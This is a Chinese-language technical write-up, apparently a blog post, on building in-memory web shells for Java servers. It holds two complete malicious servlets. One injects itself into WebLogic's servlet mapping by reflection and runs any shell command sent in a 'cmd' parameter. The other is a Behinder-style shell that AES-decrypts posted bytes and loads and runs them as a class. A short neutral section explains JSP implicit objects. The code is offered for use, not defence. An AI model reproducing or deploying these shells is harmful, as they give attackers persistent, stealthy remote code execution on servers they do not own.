java web项目的java代码一般都是在三大组件中执行的，不能像一般java项目中从main函数中执行，如果要在初始化的时候就执行可以放在ServletContextListener的contextInitialized方法中执行，如果要模拟JSP的调用，可以写一个继承HttpServlet的类，然后在doGet方法中执行，这对测试基于JSP运行的内存马很方便，在servlet中可以运行之类可以直接移动到JSP页面运行，例如

package web;

import weblogic.servlet.internal.ServletStubImpl;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

@WebServlet("/regserv")
public class evilServlet2 implements Servlet {
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {

        // 创建servlet
        HttpServlet httpServlet = new HttpServlet() {
            @Override
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
                String cmd = req.getParameter("cmd");
                if (cmd != null) {
                    Process process = Runtime.getRuntime().exec(cmd);
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                    String a;
                    PrintWriter out = resp.getWriter();
                    while ((a = bufferedReader.readLine()) != null) {
                        out.write(a);
                    }
                    out.flush();
                    out.close();
                    process.destroy();
                }


                return;
            }
        };

        String URI = "/aaa";
// 获取servletContext
        weblogic.servlet.internal.WebAppServletContext servletContext = (WebAppServletContext) servletRequest.getServletContext();

        try {
            // 获取servletMapping
            Method getServletMapping = servletContext.getClass().getDeclaredMethod("getServletMapping");
            getServletMapping.setAccessible(true);
            ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext);

            // 使用ServletStub包装HttpServlet
            Constructor<?> ServletStubImplConstructor = Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class);
            ServletStubImplConstructor.setAccessible(true);
            ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(URI, httpServlet, servletContext);

            // 使用URLMathchHelper包装ServletStub
            Constructor<?> URLMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, ServletStubImpl.class);
            URLMatchHelperConstructor.setAccessible(true);
            Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub);

            // 添加到ServletMapping中，即代表注入servlet内存马成功
            if (mappings.get(URI) == null){
                mappings.put(URI, umh);
            }

        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException | ClassNotFoundException | InstantiationException e) {
            e.printStackTrace();
        }

    }

    public String getServletInfo() {
        return null;
    }

    public void destroy() {

    }
}


关于JSP中预定义的对象：
在JSP页面中，你可以直接使用一些预定义的变量，这些变量是由Servlet容器（如Tomcat或WebLogic）提供的。这些预定义的变量包括以下几个：

request：HttpServletRequest对象，代表客户端的请求。
response：HttpServletResponse对象，代表服务端的响应。
out：JspWriter对象，用于输出HTML到客户端。
session：HttpSession对象，代表客户端的会话。
application：ServletContext对象，代表Web应用程序的上下文。
config：ServletConfig对象，包含了Servlet的初始化参数。
pageContext：PageContext对象，提供了对上述所有对象以及其他页面范围的属性的访问。

关于JSP的PageContext对象：
PageContext是JSP的一个核心概念，它为JSP页面提供了一种方式来访问特定的名称空间，并提供了一些有用的页面级别的服务。在PageContext中，你可以通过调用相应的getter方法来获取到其他的预定义变量，例如：

PageContext.getRequest()：返回HttpServletRequest对象。
PageContext.getResponse()：返回HttpServletResponse对象。
PageContext.getOut()：返回JspWriter对象。
PageContext.getSession()：返回HttpSession对象。
PageContext.getApplication()：返回ServletContext对象。
另外，PageContext还提供了一系列的方法，允许你在不同的范围（page, request, session, application）中设置和获取属性：

PageContext.setAttribute(String name, Object value)：将给定的对象绑定到给定的名称并存储在页面范围内。同样的，还有对应的request.setAttribute(), session.setAttribute()和application.setAttribute()等方法，可以在不同的范围中设置属性。
PageContext.getAttribute(String name)：返回存储在给定名称的页面范围内的对象。同样的，还有对应的request.getAttribute(), session.getAttribute()和application.getAttribute()等方法，可以在不同的范围中获取属性。


冰蝎内存马的java代码只需要在原来基础上稍微修改一下，以下是冰蝎 servlet类型内存马，不过需要记得冰蝎是post请求，冰蝎服务端需要写在doPost函数下面：

package web;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;


//恶意的servlet实现的冰蝎内存马
//可以通过在tomcat或者weblogic上用jsp注册的一个servlet的方式，将这个内存马插入到服务器中

@WebServlet("/evil")
public class evilServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doGet(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        class U extends ClassLoader{
            U(ClassLoader c){
                super(c);
            }
            public Class g(byte []b){
                return super.defineClass(b,0,b.length);
            }
        }


        String k = "e45e329feb5d925b";
        HttpSession session = req.getSession();
        session.setAttribute("u", k);
        Cipher c = null;
        try {
            c = Cipher.getInstance("AES");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        }
        try {
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }
        javax.servlet.jsp.PageContext pageContext = javax.servlet.jsp.JspFactory.getDefaultFactory().getPageContext(this, req, resp, null, true, 8192, true);
        try {
            new U(this.getClass().getClassLoader()).g(
                    c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()))).newInstance().equals(pageContext);
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        }



    }
}
